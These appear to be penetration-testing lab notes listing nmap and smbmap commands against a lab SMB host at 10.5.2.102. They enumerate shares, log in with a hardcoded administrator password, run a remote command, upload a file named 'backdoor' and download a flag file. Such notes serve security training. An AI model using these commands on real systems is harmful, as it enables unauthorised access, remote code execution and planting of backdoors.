On Linux:
>Discover smb protocols with nmap
>`nmap -p445 --script smb-protocols 10.5.2.102`
>** SMBmap **
>Discover all the available shares on the target
>`smbmap -u guest -p "" -d . -H 10.5.2.102`
>Access the remote shares using credentials
>`smbmap -u administrator -p smbserver_771 -d . -H 10.5.2.102`
>Execute commands via smb with smbmap
>`smbmap -u administrator -p smbserver_771 -H 10.5.2.102 -x 'ipconfig'`
>List all available drivers shared
>`smbmap -u administrator -p smbserver_771 -H 10.5.2.102 -L`
>List contents of the C:\ driver
>`smbmap -u administrator -p smbserver_771 -H 10.5.2.102 -r 'C$'`
>Upload a file
>`smbmap -u administrator -p smbserver_771 -H 10.5.2.102 --upload '/root/backdoor' 'C$\backdoor'`
>Download a file
>`smbmap -u administrator -p smbserver_771 -H 10.5.2.102 --download 'C$\flag.txt'`